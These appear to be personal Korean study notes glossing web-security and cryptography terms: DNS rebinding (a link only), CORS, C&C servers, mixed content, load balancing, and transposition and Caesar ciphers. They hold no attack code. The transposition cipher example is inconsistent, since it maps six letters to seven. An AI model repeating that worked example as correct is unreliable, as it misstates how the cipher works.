DNS rebinding Attack				, https://kookhh0827.tistory.com/entry/Webhacking-SOPSame-Origin-Policy-%EC%86%8C%EA%B0%9C%EC%99%80-DNS-rebinding%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%9A%B0%ED%9A%8C%EB%B2%95%EC%8B%A4%EC%8A%B5-%ED%8F%AC%ED%95%A8

CORS	  : 교차 출처 리소스 공유, 교차 출처 자원 공유는 웹 페이지 상의 제한된 리소스를 최초 자원이 서비스된 도메인 밖의 다른 도메인으로부터 요청할 수 있게 허용하는 구조이다
		SOP 예외 정책 이런거 인듯, 보통 화이트 리스트 방식으로 허용함

C&C 서버	  : 공격자가 PC/서버를 장악한 후 공격자가 원하는 명령을 하기 위해 만든 서버다
		- 개인정보 유출, 파괴들 대현 보안사고 만들기 위해 꼭 필요함

mixed content	: 유저가 HTTPS로 제공되는 웹페이지에 방문하였을때 유저와 웹서버의 연결은 TLS로 암호화되어지며 따라서 스니퍼와 중간공격자에게서 보호받을 수 있다.
		  HTTPS페이지가 몇몇 일반적인 HTTP를 포함한다면 연결은 단지 부분적으로 암호화된다: 비암호화된 컨텐츠는 스니퍼에서 접근가능하며 중간공격자에 의해 내용이 수정될 수 있다. 
		  그러므로 연결은 더이상 안전하지 않다. 웹페이지가 이런 형태로 제공될때 그 페이지는 mixed content 페이지라고 불린다.

로드 밸런싱	: 하나의 인터넷 서비스가 발생하는 트래픽이 많을 때 여러 대의 서버가 분산처리하여 서버의 로드율 증가, 부하량, 속도저하 등을 고려하여 적절히 분산처리하여 해결해주는 서비스

전치 암호(transposition cipher) : 평문의 순서를 재배치하여 암호화하는 방법		,ex) 암호가 14352면 ABCDEF -> ADCEBFG
									     복호화는 [1의 인덱스: 1][2의 인덱스: 5][3의 인덱스: 3][4의 인덱스: 2][5의 인덱스: 4] : 복호화 키는 15324
	-> https://blackperl-security.gitlab.io/blog/2016/12/03/2016-12-03-amalmot/ , 다양한 전치암호 방식

치환 암호(Caesar cipher, 카이사르 암호, 시저암호) : 평문의 알파벳들을 각각 일정한 거리만큼 떨어진 다른 알파벳으로 치환하는 방식입니다.

	- 시저 암호는 알파벳을 쉬프트 한 것이기 때문에 하나의 알파벳이 어떤 알파벳으로 바뀌는지에 따라 다른 알파벳들도 무엇으로 바뀔지 결정납니다.
	- 단일치환 :  쉬프트를 사용하지 않고 순서에 상관 없이 무작위의 한 알파벳과 1대 1 대응, 더 복잡해짐